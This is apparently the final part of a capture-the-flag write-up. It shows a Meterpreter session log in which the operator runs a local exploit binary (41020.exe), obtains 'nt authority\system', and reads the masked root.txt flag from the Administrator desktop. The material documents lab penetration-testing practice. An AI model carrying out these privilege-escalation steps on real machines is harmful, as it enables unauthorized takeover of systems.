+100777/rwxrwxrwx  1798656  fil   2024-10-28 07:06:58 -0500  winpeas.exe
+
+meterpreter &gt; 41020.exe
+[-] Unknown command: 41020.exe. Run the help command for more details.
+meterpreter &gt; cmd
+[-] Unknown command: cmd. Run the help command for more details.
+meterpreter &gt; shell
+Process 1728 created.
+Channel 2 created.
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+C:\Users\kostas\Desktop&gt;41020.exe
+41020.exe
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+C:\Users\kostas\Desktop&gt;whoami
+whoami
+nt authority\system
+
+C:\Users\kostas\Desktop&gt;cd ..
+ccd ..
+
+C:\Users\kostas&gt;d ..
+cd ..
+
+C:\Users&gt;cd Administrator
+cd Administrator
+
+C:\Users\Administrator&gt;dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is EE82-226D
+
+ Directory of C:\Users\Administrator
+
+18/03/2017  01:52 ��    &lt;DIR&gt;          .
+18/03/2017  01:52 ��    &lt;DIR&gt;          ..
+18/03/2017  01:52 ��    &lt;DIR&gt;          Contacts
+18/03/2017  02:14 ��    &lt;DIR&gt;          Desktop
+18/03/2017  01:52 ��    &lt;DIR&gt;          Documents
+18/03/2017  01:52 ��    &lt;DIR&gt;          Downloads
+18/03/2017  01:52 ��    &lt;DIR&gt;          Favorites
+18/03/2017  01:52 ��    &lt;DIR&gt;          Links
+18/03/2017  01:52 ��    &lt;DIR&gt;          Music
+18/03/2017  01:52 ��    &lt;DIR&gt;          Pictures
+18/03/2017  01:52 ��    &lt;DIR&gt;          Saved Games
+18/03/2017  01:52 ��    &lt;DIR&gt;          Searches
+18/03/2017  01:52 ��    &lt;DIR&gt;          Videos
+               0 File(s)              0 bytes
+              13 Dir(s)   5.668.524.032 bytes free
+
+C:\Users\Administrator&gt;cd Desktop
+cd Desktop
+
+C:\Users\Administrator\Desktop&gt;dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is EE82-226D
+
+ Directory of C:\Users\Administrator\Desktop
+
+18/03/2017  02:14 ��    &lt;DIR&gt;          .
+18/03/2017  02:14 ��    &lt;DIR&gt;          ..
+28/10/2024  01:01 ��                34 root.txt
+               1 File(s)             34 bytes
+               2 Dir(s)   5.668.524.032 bytes free
+
+C:\Users\Administrator\Desktop&gt;type root.txt
+type root.txt
+e**************************************************************a
+</code></pre><p id="127d1b9f-8847-809e-b761-efb49587f602" class="">
+</p></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
